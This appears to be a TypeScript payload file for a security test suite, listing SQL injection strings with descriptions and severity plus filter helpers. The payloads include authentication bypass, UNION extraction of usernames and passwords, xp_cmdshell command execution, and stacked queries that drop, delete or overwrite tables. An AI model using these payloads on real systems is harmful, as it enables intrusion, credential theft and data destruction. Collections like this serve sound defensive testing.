/**
 * SQL Injection Payloads
 * Comprehensive collection of SQL injection attack payloads for testing
 */

export interface SQLInjectionPayload {
  payload: string;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  database?: string; // Specific database if applicable
}

export const SQL_INJECTION_PAYLOADS: SQLInjectionPayload[] = [
  // Basic SQL injection
  {
    payload: "' OR '1'='1",
    description: "Basic SQL injection to bypass authentication",
    severity: 'critical',
  },
  {
    payload: "' OR '1'='1' --",
    description: "SQL injection with comment to ignore rest of query",
    severity: 'critical',
  },
  {
    payload: "' OR '1'='1' /*",
    description: "SQL injection with block comment",
    severity: 'critical',
  },
  {
    payload: "admin' --",
    description: "SQL injection in username field",
    severity: 'critical',
  },
  {
    payload: "' OR 1=1--",
    description: "Numeric SQL injection",
    severity: 'critical',
  },
  
  // UNION-based attacks
  {
    payload: "' UNION SELECT NULL--",
    description: "UNION-based SQL injection test",
    severity: 'critical',
  },
  {
    payload: "' UNION SELECT NULL,NULL--",
    description: "UNION injection with multiple columns",
    severity: 'critical',
  },
  {
    payload: "' UNION SELECT username,password FROM users--",
    description: "UNION injection to extract data",
    severity: 'critical',
  },
  {
    payload: "' UNION SELECT 1,2,3,4,5--",
    description: "UNION injection to determine column count",
    severity: 'high',
  },
  
  // Boolean-based blind attacks
  {
    payload: "' AND 1=1--",
    description: "Boolean-based blind SQL injection (true condition)",
    severity: 'high',
  },
  {
    payload: "' AND 1=2--",
    description: "Boolean-based blind SQL injection (false condition)",
    severity: 'high',
  },
  {
    payload: "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
    description: "Boolean-based blind injection to detect MySQL version",
    severity: 'high',
    database: 'mysql',
  },
  
  // Time-based blind attacks
  {
    payload: "'; WAITFOR DELAY '00:00:05'--",
    description: "Time-based blind SQL injection (SQL Server)",
    severity: 'high',
    database: 'mssql',
  },
  {
    payload: "' AND SLEEP(5)--",
    description: "Time-based blind SQL injection (MySQL)",
    severity: 'high',
    database: 'mysql',
  },
  {
    payload: "' AND pg_sleep(5)--",
    description: "Time-based blind SQL injection (PostgreSQL)",
    severity: 'high',
    database: 'postgresql',
  },
  
  // Error-based attacks
  {
    payload: "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    description: "Error-based SQL injection (MySQL)",
    severity: 'high',
    database: 'mysql',
  },
  {
    payload: "'; EXEC xp_cmdshell('dir')--",
    description: "SQL Server command execution",
    severity: 'critical',
    database: 'mssql',
  },
  
  // Stacked queries
  {
    payload: "'; DROP TABLE users; --",
    description: "Stacked query to drop table",
    severity: 'critical',
  },
  {
    payload: "'; DELETE FROM users WHERE '1'='1'; --",
    description: "Stacked query to delete data",
    severity: 'critical',
  },
  {
    payload: "'; UPDATE users SET password='hacked' WHERE '1'='1'; --",
    description: "Stacked query to update data",
    severity: 'critical',
  },
  
  // PostgreSQL-specific
  {
    payload: "'; COPY (SELECT * FROM users) TO '/tmp/users.csv'; --",
    description: "PostgreSQL COPY command injection",
    severity: 'critical',
    database: 'postgresql',
  },
  {
    payload: "'; CREATE TABLE test (data text); --",
    description: "PostgreSQL table creation injection",
    severity: 'high',
    database: 'postgresql',
  },
  
  // Oracle-specific
  {
    payload: "' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(58)||(SELECT * FROM (SELECT (SELECT CONCAT(USERNAME,CHR(58),PASSWORD) FROM ALL_USERS WHERE ROWNUM=1) FROM DUAL)||CHR(62)))) FROM DUAL) IS NULL--",
    description: "Oracle XMLType injection",
    severity: 'high',
    database: 'oracle',
  },
  
  // NoSQL-style SQL injection
  {
    payload: "' || '1'='1",
    description: "String concatenation SQL injection",
    severity: 'high',
  },
  {
    payload: "1' || '1'='1",
    description: "Numeric concatenation SQL injection",
    severity: 'high',
  },
];

/**
 * Get SQL injection payloads filtered by database type
 */
export function getSQLInjectionPayloads(database?: string): SQLInjectionPayload[] {
  if (!database) {
    return SQL_INJECTION_PAYLOADS;
  }
  return SQL_INJECTION_PAYLOADS.filter(
    p => !p.database || p.database.toLowerCase() === database.toLowerCase()
  );
}

/**
 * Get SQL injection payloads by severity
 */
export function getSQLInjectionPayloadsBySeverity(severity: 'critical' | 'high' | 'medium' | 'low'): SQLInjectionPayload[] {
  return SQL_INJECTION_PAYLOADS.filter(p => p.severity === severity);
}

